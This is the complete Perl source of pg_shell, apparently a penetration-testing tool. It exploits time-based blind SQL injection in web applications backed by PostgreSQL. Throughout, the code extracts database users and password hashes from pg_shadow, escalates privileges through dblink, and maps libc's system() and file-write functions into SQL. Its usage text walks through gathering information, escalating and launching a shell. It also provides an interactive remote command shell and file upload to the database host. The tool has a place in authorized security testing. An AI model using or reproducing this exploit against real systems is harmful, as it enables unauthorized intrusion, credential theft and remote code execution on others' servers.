#!/usr/bin/perl
#
# Copyright (c) 2006, Nico Leidecker
# All rights reserved.
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are met:
#
#     * Redistributions of source code must retain the above copyright
#       notice, this list of conditions and the following disclaimer.
#     * Redistributions in binary form must reproduce the above copyright
#       notice, this list of conditions and the following disclaimer in the
#       documentation and/or other materials provided with the distribution.
#     * Neither the name of the organization nor the names of its contributors 
#       may be used to endorse or promote products derived from this software 
#       without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE REGENTS AND CONTRIBUTORS ``AS IS'' AND ANY
# EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
# DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE FOR ANY
# DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
# (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
# ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
# SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
#

use strict;
use Thread;
use IO::Socket;
use MIME::Base64;

my $host;
my $request_file;
my $request_template;
my $port                    = 80;

# options
my $verbose                 = 0;
my $delay                   = 4;
my $pseudo_iter_req         = 0;
my $pseudo_wait_iterations  = 0;
my $skip_delay_test         = 0;
my $threads                 = 10;
my $session                 = undef;
my $get_info                = undef;
my $get_settings            = undef;
my $get_user_info           = undef;
my $get_user_priv           = undef;
my $priv_esc_test			= 0;
my $create_functions		= undef;
my $session_file	        = './session.log';
my $i_am_super              = undef;
my $statistics              = undef;
my $action                  = undef;

# statistics
my $total_bytes             = 0;
my $total_queries           = 0;

my $upload_src;
my $upload_dst;

# blank session hash
my $SESSION = { 
	"target.libc"		=>		'/lib/libc.so.6',
	"target.open.flag"	=>		522,
	"target.open.mode"	=>		448
};

###############################################################################
## STATIC QUERIES                                                            ##
###############################################################################

my $QUERIES = {
        ## INFORMATION QUERIES
        postgres_version        =>      "SELECT
                                            version() AS result,
                                            length(version()) AS num",
        database_name           =>      "SELECT
                                            current_database() AS result,
                                            length(current_database()) AS num",
        current_user            =>      "SELECT
                                            current_user AS result,
                                            length(current_user) AS num",
        super_users             =>      "SELECT
                                            usename AS result,
                                            length(usename) AS num
                                         FROM
                                            pg_user
                                         WHERE
                                            usesuper = 't'
                                         ORDER BY
                                            usename",
        passwd_hashes           =>      "SELECT
                                            passwd AS result,
                                            length(passwd) AS num 
                                         FROM
                                            pg_shadow",
        all_users               =>      "SELECT
                                            usename AS result,
                                            length(usename) AS num
                                         FROM
                                            pg_user
                                         ORDER BY
                                            usename",
        has_plpgsql             =>      "SELECT
                                            lanname
                                         FROM
                                            pg_language
                                         WHERE
                                            lanname = 'plpgsql'",
        create_plpgsql			=>		"CREATE LANGUAGE 'plpgsql'",
        user_priv_createdb      =>      "SELECT
                                            usecreatedb
                                         FROM
                                            pg_user
                                         WHERE
                                            usecreatedb = 't'",
        user_priv_super         =>      "SELECT
                                            usesuper
                                         FROM
                                            pg_user
                                         WHERE
                                            usesuper = 't'",
        user_priv_catupd        =>      "SELECT
                                            usecatupd
                                         FROM
                                            pg_user
                                         WHERE
                                            usecatupd = 't'",
        pg_settings             =>      "SELECT
                                            setting AS result,
                                            length(setting) AS num
                                         FROM
                                            pg_settings",
        check_func              =>      "SELECT
                                            proname
                                         FROM
                                            pg_proc",
                                            
        system_create           =>      "CREATE OR REPLACE FUNCTION system(cstring)
                                         RETURNS int AS " . $SESSION->{"target.libc"} . "', 'system'
                                         LANGUAGE 'C' STRICT;",
                                         
        system_test             =>      "SELECT MAX(system('pwd'))",

        pg_sleep_create         =>      "CREATE OR REPLACE FUNCTION pg_sleep(delay int) RETURNS void AS '
                                         DECLARE
                                            tm timestamptz; 
                                            eot timestamptz; 
                                         BEGIN
                                            SELECT now() + (delay || ''seconds'' )::interval INTO eot;
                                            LOOP
                                                SELECT timeofday() INTO tm; 
                                                EXIT WHEN tm > eot; 
                                            END LOOP;
                                        END;' LANGUAGE 'plpgsql';",
                                        
		open_create				=>		"CREATE OR REPLACE FUNCTION open(cstring, int, int) 
	      								 RETURNS int AS '" . $SESSION->{"target.libc"} . "', 'open' 
	      								 LANGUAGE 'C' STRICT;",
	      								 
		close_create			=>		"CREATE OR REPLACE FUNCTION close(int) 
	      								 RETURNS int AS '" . $SESSION->{"target.libc"} . "', 'open' 
	      								 LANGUAGE 'C' STRICT;",
	      								 
		write_create			=>		"CREATE OR REPLACE FUNCTION write(int, cstring, int) 
	      								 RETURNS int AS '" . $SESSION->{"target.libc"} . "', 'write' 
	      								 LANGUAGE 'C' STRICT;",		
	      								 						 
		write_to_file_create	=>		"CREATE OR REPLACE FUNCTION write_to_file(file TEXT, s TEXT) RETURNS int AS
	     								 \$\$
										 DECLARE
		    								fh int;
		    								rs int;
										    w bytea;
										    i int;
										 BEGIN
										    SELECT open(textout(file)::cstring,".$SESSION->{"target.open.flag"}.",".$SESSION->{"target.open.mode"}.") INTO fh;
										    IF fh <= 2 THEN
												RETURN 1;
										    END IF;
										    
										    SELECT decode(s, 'base64') INTO w;
								
										    i := 0;
										    LOOP
												EXIT WHEN i >= octet_length(w);
												SELECT write(fh, textout(chr(get_byte(w, i)))::cstring, 1) INTO rs;
												
												
												IF rs < 0 THEN
												    RETURN 2;
												END IF;
												i := i + 1;
										    END LOOP;
								
										    SELECT close(fh) INTO rs;
										    RETURN 0;
										 END;
										 \$\$ LANGUAGE 'plpgsql';"
										 # 1090 = O_CREAT | O_APPEND | O_RDWR   448 = S_IRWXU
};

# SELECT write(fh, textout(chr(get_byte(w, i)))::cstring, 1) INTO rs;
###############################################################################
## HTTP REQUEST AND DELAY FUNCTIONS                                          ##
###############################################################################
# put the injection into the request template
sub prepare_request {
    my $query = shift;

    # url encode
    $query =~ s/[\t\r\n]/ /g;
    $query =~ s/([^A-Za-z0-9])/sprintf("%%%2X", ord($1))/seg;

    my $request = $request_template;

    $request =~ s/<<INJECTION>>/$query/;

    return $request;
}

# send a request to the host
sub request {
    my ($query) = @_;

    my $conn = new IO::Socket::INET (
                        PeerAddr        =>  $host,
                        PeerPort        =>  $port,
                        Proto           =>  'tcp') || die("! cannot connect to $host:$port: $!");

    my $request = prepare_request($query);

    print $conn $request;

    my $response = "";
    while (<$conn>) {
        $response .= $_;
    }

    $total_queries++;
    $total_bytes += length($request);
}

# send a request to the host and calculate a delay
sub request_with_delay {
    my ($delay, $query) = @_;

    my $start = time;
    request($query);
    my $end = time;

    if (($end - $start) >= $delay) {
        return 1;
    }

    return 0;
}

# set one of three delay functions, depending on what function is available
sub set_delay_function {
    my $delay = shift;

    if ($SESSION->{sleep_available}) {
        return "pg_sleep($delay)";
    } else {
        # pseudo delay (CPU performance consuming)
        return "repeat(md5(1), $pseudo_wait_iterations)";
    }
}

# print request statistics
sub statistics {
    print "total queries sent: $total_queries\n";
    print "total bytes sent: $total_bytes\n";
}

###############################################################################
## DELAY FUNCTIONS                                                           ##
###############################################################################

#sub test_and_create_plpgsql {
#		print "* Testing plpgsql language: ";
#		if (!boolean_guessing($QUERIES->{has_plpgsql})) {
#			print "unavailable ... creating ...";
#			request($QUERIES->{create_plpgsql});
#			print "testing ...";
#			if (!boolean_guessing($QUERIES->{has_plpgsql})) {
#				print "failed\n";
#       		session_update('pspgsql_available', 0);
#				return 0;
#			}
#		}
#    	session_update('pspgsql_available', 1);
#		print "done\n";
#		return 1;
#}

sub test_pg_sleep {
	my $echo = $1;
	
	if ($echo) {
 	   print "* Testing pg_sleep function: ";
	}
    my $start = time;
    request("SELECT pg_sleep($delay);");
    if (time - $start >= $delay) {
        session_update('sleep_available', '1');
        if ($echo) {
       		print "available\n";
        }
        return 1;
    }
    if ($echo) {
    	print "unavailable\n";
    }
    return 0;
}

sub create_pg_sleep {
    print "    create pg_sleep function ... ";

    request($QUERIES->{pg_sleep_create});
    print "testing ... ";
    if (test_pg_sleep(0)) {
        print "done\n";
        return 1;
    }

    print "failed\n";
    return 0;
}

sub retest_pseudo_delay {
    my ($retests, $iterations) = @_;
    my $start;
    my $diff;

    vprint("    test $iterations: ");
    while ($retests-- > 0) {
        $start = time;
        request("SELECT repeat(md5(1), $iterations);");
        $diff = time - $start;
        vprint("$diff ");
        if ($diff < $delay) {
            vprint("< $delay  failed for $iterations\n");
            return 0;
        }
    }
    return 1;
}

sub test_and_set_pseudo_delay {
    my $iter_req = shift;
    my $iterations;
    my $start;
    my $diff = 0;
    my $i;

    print "* Testing for delay ($delay):\n";

    if ($iter_req) {
        if (retest_pseudo_delay(3, $iter_req)) {
            $iterations = $iter_req;
        } else {
            return 0;
        }
    } else {
        $iterations = 10000;
        print "* Normal Latency: ";
        $start = time;
        request("SELECT 1");
        my $latency = time - $start;
        print "$latency seconds\n";
        $delay += $latency;

        my $proved;
        $diff = 0;
        do {
            #$iterations += int($iterations / ((($delay - ($delay - $diff)) + 1 ) * 2));
            #$iterations += int( 100000 * ( 1 + (1 / ($delay - $diff + 1)) ) ** 4);
           $iterations *= 2;
            print "    $iterations:\t";
            $start = time;
            request("SELECT 1 FROM repeat(md5(1), $iterations);");
            $diff = time - $start;
            print "$diff\n";
        } while(($diff < $delay) || !retest_pseudo_delay(5, $iterations));
    }
    $pseudo_wait_iterations = $iterations;
    print "\n* using $iterations iterations for pseudo wait function\n";
    return 1;
}

###############################################################################
## RESULT GUESSING                                                           ##
###############################################################################

# guess a number `num'
sub guess_num {
    my $query = shift;

    my $num;
    my $rs;

    do {
        my $max = 16;
        my $step = 16;
        $num = 16;
        do {
            vvprint(".");
            my $bin_query = "SELECT " . set_delay_function($delay) . " FROM ($query) AS q WHERE q.num > $num;";

            if (request_with_delay($delay, $bin_query) > 0) {
                # if there was a delay, the length must be more
                if ($step == $max / 2) {
                    $max *= 2;
                    $num *= 2;
                    $step = $num;
                } else {
                    $num += $step;
                }
            } else {
                # length must be less
                $step = int($step / 2);
                $num -= $step;
            }
        } while($step != 0);

        # do a recheck
        my $recheck = "SELECT " . set_delay_function($delay * 2) . " FROM ($query) AS q WHERE q.num <> $num;";
        if (($rs = request_with_delay($delay * 2, $recheck)) > 0) {
            vvprint("?");
        }
    } while ($rs > 0);
    return $num;
}

# guess a character from `result'
sub guess_char {
    my ($query, $pos) = @_;

    my $char = undef;
    my $rs;

    do {
        my $c = 64;
        my $part = 64;
        do {
            vvprint(".");

            my $guess = "SELECT " . set_delay_function($delay) . " FROM ($query) AS q WHERE substring(q.result, $pos, 1) < chr($c);";

            $part = int($part / 2);

            if (($rs = request_with_delay($delay, $guess)) > 0) {
                # if there was a delay, the current character must be lower
                $c -= $part;
            } else {
                # character must be higher
                $c += $part;
            }

            if ($part == 0) {
                if ($rs > 0) {
                    $char = $c - 1;
                } else {
                    $char = $c;
                }
            }
        } while(!defined($char));

        vvprint(chr($char));

        # do a recheck
        my $recheck = "SELECT " . set_delay_function($delay * 2) . " FROM ($query) AS q WHERE substring(q.result, $pos, 1) <> chr($char);";
        if (($rs = request_with_delay($delay * 2, $recheck)) > 0) {
            print "?";
        }
    } while ($rs > 0);

    return chr($char);
}

# perform a binary guessing
sub binary_guessing {
    my $query = shift;

    vvprint("<");

    my $length = guess_num($query);
    vvprint("($length)");

    my @thr;
    my $result = "";
    for (my $l = 1; $l <= $length; $l+=$threads) {
        for (my $i = $l; $i < $l + $threads && $i <= $length; $i++) {
            $thr[$i] = threads->new(\&guess_char, $query, $i);
        }

        for (my $i = $l; $i < $l + $threads && $i <= $length; $i++) {
            $result .= $thr[$i]->join;
        }
    }

    vvprint("> ");
    print "$result\n";

    return $result;
}

# perform a boolean guessing
sub boolean_guessing {
    my $query = shift;
    my $invert = shift;

    my $guess = "SELECT " . set_delay_function($delay) . " WHERE " . (!$invert ? "NOT" : "") . " EXISTS ($query)";

    if (request_with_delay($delay, $guess)) {
        return 0;
    }

    return 1;
}

sub returns_null_guessing {
    my $query = shift;
    my $guess = "SELECT " . set_delay_function($delay) . " WHERE 0 <> ($query)";
    if (request_with_delay($delay, $guess)) {
        return 0;
    }
    return 1;
}

# guess a whole result table
sub guess_result {
    my $query = shift;

    my $qty = "SELECT count(q.result) AS num FROM ($query) AS q";
    my $num = guess_num($qty);
    print "$num\n";

    my $guess = "SELECT o.result AS result, o.num AS num FROM ($query) AS o ";
    my $tail = " LIMIT 1";
    my $result;
    my @results = ();
    while($num-- > 0) {
        $result = binary_guessing($guess . $tail);
        push(@results, $result);
        $tail = "WHERE o.result NOT IN ('" . join('\',\'', @results) . "') LIMIT 1";	
    }

    return @results;
}

###############################################################################
## SESSION HANDLING                                                          ##
###############################################################################
# update the session hash
sub session_update {
    my ($field, $value) = @_;
    $SESSION->{$field} = $value;
}

# write session to file specified by $session_file
sub session_write {
    open (SESSION_LOG, ">$session_file") || die("! could not open $request_file for reading: $!");

    foreach (sort(keys(%$SESSION))) {
        if (ref($SESSION->{$_}) eq 'ARRAY') {
            print SESSION_LOG "\@$_=@{$SESSION->{$_}}\n";
        } else {
            print SESSION_LOG "=$_=$SESSION->{$_}\n";
        }
    }

    close(SESSION_LOG);
}

# read from file into the session hash
sub session_read {
    if (!open (SESSION_LOG, "<$session_file")) {
        eprint("! no session file found: $!\n");
        return;
    }

    while (<SESSION_LOG>) {

        if (/^(.)(.+)=(.+)$/) {
            my $flag = $1;
            my $field = $2;
            my $value = $3;
            # settings can be appear as scalar ('=') or array ('@') in the session file
            if ($flag eq '=') {
                $SESSION->{$field} = $value;
            } else {
                my @array_value = split(/ /, $value);
                if (scalar @array_value > 0) {
                    $SESSION->{$field} = \@array_value;
                }
            }
        }
    }
    close(SESSION_LOG);
}

# dump the session file
sub session_dump {
    open (SESSION_LOG, "<$session_file") || die("! could not open $request_file for reading: $!");;

    while(<SESSION_LOG>) {
        print "$_";
    }

    close(SESSION_LOG);
}

###############################################################################
## GET METHODS                                                               ##
###############################################################################
sub get_methods {
    if ($get_settings) {
        get_settings();
    }

    if ($get_info) {
        get_info();
    }

    if ($get_user_info) {
        get_user_info();
    }

    if ($get_user_priv) {
        get_user_priv();
    }
}

sub get_settings {

    print "* PostgreSQL Settings:\n";

    if (flag_set($get_settings, 'l')) {
        print "    listen addresses: ";
        my $listen_address = binary_guessing($QUERIES->{pg_settings} . " WHERE name = 'listen_addresses'");
     #   print "$listen_address\n";
        session_update('settings.listen_address', $listen_address);
 
    }

    if (flag_set($get_settings, 'p')) {
        vprint("    port: ");
        my $port = binary_guessing($QUERIES->{pg_settings} . " WHERE name = 'port'");
    #    print "$port\n";
        session_update('settings.port', $port);
    }

    if (flag_set($get_settings, 'e')) {
        vprint("    password encryption: ");
        my $password_encryption = boolean_guessing($QUERIES->{pg_settings} . " WHERE name = 'password_encryption' AND setting = 'on'");
        if ($password_encryption) {
        	print "no\n";
        } else {
            print "yes\n";
        }
        session_update('settings.password_encryption', $password_encryption);
    }
}

sub get_user_info {

    print "* User Informations:\n";

    if (flag_set($get_user_info, 'a')) {
        print "    users: ";
        if (!$SESSION->{'user_info.users'}) {
            my @users = guess_result($QUERIES->{all_users});
            session_update('user_info.users', \@users);
        } else {
            print "@{$SESSION->{'user_info.users'}}\n";
        }
    }

    if (flag_set($get_user_info, 's')) {
        print "    super users: ";
        if (!$SESSION->{'user_info.supers'}) {
            my @users = guess_result($QUERIES->{super_users});
            session_update('user_info.supers', \@users);
        } else {
            print "(@{$SESSION->{'user_info.supers'}})\n";
        }
    }

    if (flag_set($get_user_info, 'p')) {
        if (!$i_am_super && !priv_esc_sanity_check()) {
            print "! current user is not super user and privilege escalation has not yet been approved\n";
            print "  or is not possible.\n";
        }

        my $hash;
        foreach (@{$SESSION->{'user_info.users'}}) {
           print "    $_: ";
            if (!$SESSION->{'user_info.password.' . $_}) {
                if ($i_am_super) {
                    $hash = binary_guessing($QUERIES->{passwd_hashes} . " WHERE usename = '$_'");
                } else {
                    $hash = binary_guessing(priv_esc_wrap_result($QUERIES->{passwd_hashes}. " WHERE usename = '$_'"));
                }
                session_update('user_info.password.' . $_, $hash);
            } else {
                print $SESSION->{'user_info.password.' . $_} . "\n";
            }
        }
    }
}

sub get_user_priv {

    print "* User Privileges for $get_user_priv:\n";

    print "   is a super user ... ";
    print (boolean_guessing($QUERIES->{user_priv_super} . " AND usename = '$get_user_priv'") ? "yes\n" : "no\n");

    print "   can create databases ... ";
    print (boolean_guessing($QUERIES->{user_priv_createdb} . " AND usename = '$get_user_priv'") ? "yes\n" : "no\n");

    print "   can update system catalogs... ";
    print (boolean_guessing($QUERIES->{user_priv_catupd} . " AND usename = '$get_user_priv'") ? "yes\n" : "no\n");

}

sub get_info {

    print "* General Informations: \n";

    if (flag_set($get_info,'v')) {
        print "    version: ";
        if (!$SESSION->{'info.version'}) {
            my $version = binary_guessing($QUERIES->{postgres_version});
            session_update('info.version', $version);
        } else {
            print "($SESSION->{'info.current_user'})\n";
        }
    }

    if (flag_set($get_info, 'i')) {
        vprint("    who am I? ");
        if (!$SESSION->{'info.current_user'}) {
            my $me = binary_guessing($QUERIES->{current_user});
            session_update('info.current_user', $me);
        } else {
            print "($SESSION->{'info.current_user'})\n";
        }
    }

    if (flag_set($get_info, 'd')) {
        vprint("    where am I? ");
        if (!$SESSION->{'info.current_db'}) {
            my $dbname = binary_guessing($QUERIES->{database_name});
            session_update('info.current_db', $dbname);
            if (!$SESSION->{'priv_esc.dbname'}) {
                session_update('priv_esc.dbname', $dbname);
            }
        } else {
            print "($SESSION->{'info.current_db'})\n";
        }
    }
}

###############################################################################
## PRIVILEGE ESCALATION                                                      ##
###############################################################################
sub priv_esc_get_user {
    if (!$SESSION->{'priv_esc.user'}) {
        if (scalar $SESSION->{'user_info.supers'} > 0) {
            $SESSION->{'priv_esc.user'} =  $SESSION->{'user_info.supers'}[0];
            vprint("* using $SESSION->{'priv_esc.user'} for privilege escalation\n");
        } else {
            print "! Username and database name needed for privilege escalation\n";
            print "! please use the -pU or -gUs option\n";
            return 0;
        }
    }
    return 1;
}

sub priv_esc_test {
    my $approved = 0;

    print "* Testing privilege escalation capabilities:\n";

    if (!priv_esc_get_user()) {
        print "! cannot test for privilege escalation without username or database name\n";
        print "! please use the -pU and -pD option or get usernames and the database via -gU -gD\n";
        return 0;
    } else {
    	vprint("* using $SESSION->{'priv_esc.user'} for privilege escalation\n");
    }

    print "    checking functions:\n";
    print "        dblink() ... ";
    print (($approved |= boolean_guessing($QUERIES->{check_func} . " WHERE proname = 'dblink' AND pronargs = 2")) ? "found\n" : "not found\n");

    print "        dblink_exec() ... ";
    print (($approved |= boolean_guessing($QUERIES->{check_func} . " WHERE proname = 'dblink_exec' AND pronargs = 2")) ? "found\n" : "not found\n");

    print "        dblink_connect() ... ";
    print (($approved |= boolean_guessing($QUERIES->{check_func} . " WHERE proname = 'dblink_connect' AND pronargs = 1")) ? "found\n" : "not found\n");

    if (!$approved) {
        print "! dblink function missing.\n";
        return 0;
    }

# TODO:
#	print "    testing functions:\n";
#	print "        dblink() ... ";
#   print (($approved |= boolean_guessing() ? "found\n" : "not found\n");

#    print "        dblink_exec() ... ";
#    print (($approved |= boolean_guessing($QUERIES->{check_func} . " WHERE proname = 'dblink_exec' AND pronargs = 2")) ? "found\n" : "not found\n");

#    print "        dblink_connect() ... ";
#    print (($approved |= boolean_guessing($QUERIES->{check_func} . " WHERE proname = 'dblink_connect' AND pronargs = 1")) ? "found\n" : "not found\n");

    print "    local trust authentication: ";
    print (($approved = !boolean_guessing(priv_esc_wrap_result("SELECT 'result', 1"), 1)) ? "possible\n" : "failed\n");
    if (!$approved) {
        print "! local trust authentication seems to be disabled.\n";
        return 0;
    }

    session_update('priv_esc.approved', $approved);

    return 1;
}

sub priv_esc_sanity_check {

    if (!$SESSION->{'priv_esc.approved'}) {
        if (!priv_esc_test()) {
            return 0;
        }
    }

    return 1;
}

sub priv_esc_wrap_exec {
    my $query = shift;
    $query =~ s/\'/\'\'/g;
    return "SELECT dblink_exec('host=127.0.0.1 user=" . $SESSION->{'priv_esc.user'} . " dbname=' || current_database(), '$query')";
}

sub priv_esc_wrap_result {
    my $query = shift;
    $query =~ s/\'/\'\'/g;
    return "SELECT result, num FROM dblink('host=127.0.0.1 user=" .
        $SESSION->{'priv_esc.user'} . " dbname=' || current_database(), '$query') RETURNS (result TEXT, num INT)";
}

###############################################################################
## CREATE AND LAUNCH SHELL/UPLOAD FUNCTIONS                                  ##
###############################################################################
sub create_functions {

    if (flag_set($create_functions, 'S')) {
        create_system();
    }
    if (flag_set($create_functions, 'U')) {
        create_upload();
    }

}

sub create_system {
    print "mapping system function ... ";
    request(priv_esc_wrap_exec($QUERIES->{system_create}));

    print "testing ... ";
    if (boolean_guessing($QUERIES->{system_test})) {
        print "done\n";
    } else {
        print "failed\n";
    }
}

sub create_upload {
    print "mapping open function ... ";
    request(priv_esc_wrap_exec($QUERIES->{open_create}));
    print "done\n";
    
    print "mapping close function ... ";
    request(priv_esc_wrap_exec($QUERIES->{close_create}));
    print "done\n";
    
    
    print "mapping write function ... ";
    request(priv_esc_wrap_exec($QUERIES->{write_create}));
    print "done\n";

    print "preparing writing routine ... ";
    request(priv_esc_wrap_exec($QUERIES->{write_to_file_create}));
    print "done\n";
    
    

}


###############################################################################
## ACTION FUNCTIONS                                                            ##
###############################################################################
sub launch_shell {
    print "(quit with ^C)\n> ";
    while (<STDIN>) {
        returns_null_guessing("SELECT max(system('$_'))") || print "system() returned non-zero\n";
        print "> ";
    }
}

sub upload_file {
	my ($src, $dst) = @_;
	my @stats;
	my $enc;
	my $size;
	my $tot_size;
	my $str;
	
	@stats = stat($src);
	if (!@stats) {
		die("$src: $!");
	}
	$tot_size = @stats[7];
	
	vprint("* $src size is $tot_size bytes\n");
	
    print "* uploading $src to $dst ...";
    open SRC, "<$src" || die("$src: $!");
	$size = 0;
	my $in;
	while (read SRC, $in, 128) {
		$size += length $in;
		my $enc = encode_base64($in);
		#print "!!!! $enc\n";
		returns_null_guessing("SELECT write_to_file('$dst', '" . $enc . "')") 
				|| print "upload process returned non-zero\n";
 	    print "\r* uploading $src to $dst ... $size/$tot_size";
	}
	print " ... completed\n"
}


###############################################################################
## MISC FUNCTIONS                                                            ##
###############################################################################
sub banner {
	 vprint("pg_shell - The PostgreSQL Shell; Version 1.0\n" .
		   "(c) 2007 Nico Leidecker <nfl\@portcullis-security.com>\n" .
		   "http://www.portcullis.co.uk - http://www.leidecker.info\n");
}

sub usage {
print <<EOF;
Usage: $0 [OPTIONS] host[:port] request-file
 Options:

  -v[v]             verbosity level
  -d [seconds]      delay
  -i [iterations]   pseudo delay iterations
  -k                skip delay tests and rely on given parameters
  -n                number of threads (can only be used, if a wait or sleep
                    function exists)

  GET INFORMATION METHODS
    -gI[vid]        get general informations
        v :         PostgreSQL version string	
        i :         name of the current user
        d :         current database name
    -gS[lpe]        get PostgreSQL settings
        l :         listen address
        p :         port
        e :         password encryption
    -gU[sap]        get user informations
        s :         super users
        a :         all users
        p :         password hashes of all users found with -gUa (might need
                    privilege escalation)
    -gP [user]      get privileges for a user
    -gL             get ACL for the pl/PgSQL language

  PRIVILEGE ESCALATION
    -pT             explicitely test the possibility of a privilege escalation
                    (if without -pU, pick username from super users list by 
                    -gUs and database name from -gId)
    -pU [user]      use user name for privilege escalation

  FUNCTION CREATION
    -cS             create shell framework
    -cU             create file upload framework

  PERFORM ACTION
    -aS             launch a shell
    -aU src dst     upload a file

  SESSION AND STATISTICS
    -sN[NRWD]       read/write from/to session file
        N :         do not read or write to a session file
        R :         only read session information from file
        W :         only write new session information to file
        D :         dump session file
    -S              print statistics

 A complete example:

  phase 1: information gathering
    $0 -v -gIid -gUs
    $0 -v -gP someuser

  phase 2: privilege escalation
    $0 -v -pT

  phase 3: function creation
    $0 -v -cW -cS

  finally:
    $0 shell

EOF
exit(1);
}

sub read_request {
    my $file = shift;

   open(FILE, "<$request_file") || die("! could not open $request_file for reading: $!");

    $request_template = '';
    vvprint("* using request template:\n");

    while (<FILE>) {
        # if there is not \r\n, add it
        if (/[^\r]\n/) {
            s/\n$/\r\n/;
        }

        $request_template .= $_;
        vvprint($_);
    }

    close(FILE);
    return 1;
}

sub parse_options {
    my @options = @_;

    while ($_ = shift @options) {
       # help message
        if (/-h/) {
            usage();
        }
        # verbosity
        if (/-(v+)/) {
            $verbose = length($1);
        # delay
        } elsif (/-d/) {
            $delay = shift @options;
        # pseudo iterations
        } elsif (/-i/) {
            $pseudo_iter_req = shift @options;
        # skip delay tests
        } elsif (/-k/) {
            $skip_delay_test = 1;
        # threads
        } elsif (/-n/) {
            $threads = shift @options;
        # session
        } elsif (/-s([RWND]+)/) {
            $session = $1;

        # get methods
        } elsif (/-g(\w+)/) {
            if ($1 =~ /I([vid]+)/) {
               $get_info = $1;
            } elsif ($1 =~ /S([lep]+)/) {
                $get_settings = $1
            } elsif ($1 =~ /U([sap]+)/) {
                $get_user_info = $1;
            } elsif ($1 =~ /P/) {
                $get_user_priv = shift @options;
            }

        # privilege escalation
        } elsif (/-pT/) {
            $priv_esc_test = 1;
        } elsif (/-pU/) {
            $SESSION->{'priv_esc.user'} = shift @options;

        # create functions
        } elsif (/-c([SU]+)+/) {
            $create_functions = $1;

		# action functions
        } elsif (/-aS/) {
            $action = "S";
        } elsif (/-aU/) {
            $action = "U";
            $upload_src = shift @options;
            $upload_dst = shift @options;
                
        # usage
        } else {
            eprint("unrecognized option $_\n");
            usage();
        }
    }
}

sub verbose_print {
    if ($verbose >= shift) {
        print shift;
    }
}

sub vprint {
    verbose_print(1, shift);
}

sub vvprint {
    verbose_print(2, shift);
}

sub eprint {
    print STDERR shift;
}

sub flag_set {
    my ($o, $v) = @_;
    return $o =~ /$v/;
}
###############################################################################
## MAIN                                                                      ##
###############################################################################

if ($#ARGV < 1) {
	$verbose = 1;
    usage();
}

# get HTTP request template and target host information
$request_file = pop(@ARGV);
$host = pop(@ARGV);

# if not explicitely set, the port is 80
if ($host =~ /([^:]+):(\d+)/) {
    $host = $1;
    $port = $2;
}

# enable output flushing
$| = 1;

# parse the options list
parse_options(@ARGV);

banner();

if (!read_request()) {
    exit(0);
}

vprint("* target is '$host:$port' with request from '$request_file'\n");

# read session file
if (!(flag_set($session, 'N') | flag_set($session, 'R') |  flag_set($session, 'W'))) {
    $session .= 'RW';
}
if (flag_set($session, 'R')) {
    vprint("* read session file\n");
    session_read();
}

if (!$skip_delay_test) {
    if (        $get_settings
            ||  $get_info
            ||  $get_user_info
            ||  $get_user_priv
            ||  $priv_esc_test
            ||  $create_functions) {
        if (!$SESSION->{sleep_available}) {
            if (!test_pg_sleep(1)) {
                # try to create the sleep function
                if (!create_pg_sleep()) {
                    if (test_and_set_pseudo_delay($pseudo_iter_req)) {
                        $threads = 1;
                        vprint("* switching to single threaded mode, as a pseudo delay function in use\n");
                    } else {
                        die("! could not determine pseudo delay iterations\n");
                    }
                }
            }
        }
    }
} else {
    # we don't test and trust the user input
    $pseudo_wait_iterations = $pseudo_iter_req;
}

vprint("* running with $threads threads\n");


# get methods
get_methods();

## PRIVILEGE ESCALATION
if ($priv_esc_test) {
    if (!priv_esc_test()) {
        print "! sorry, no privilege escalation possible\n";
    } else {
        print "* congratulations, the target system is capable for privilege escalation\n";
    }
}

create_functions();

if (flag_set($action, 'S')) {
    launch_shell();
} elsif (flag_set($action, 'U')) {
    upload_file($upload_src, $upload_dst);
}

## SESSION AND STATISTCS
if (flag_set($session,'W')) {
    vprint("* write session file\n");
    session_write();
}

if (flag_set($session,'D')) {
    print "* session dump:\n";
    session_dump();
}

if ($statistics) {
    statistics();
}

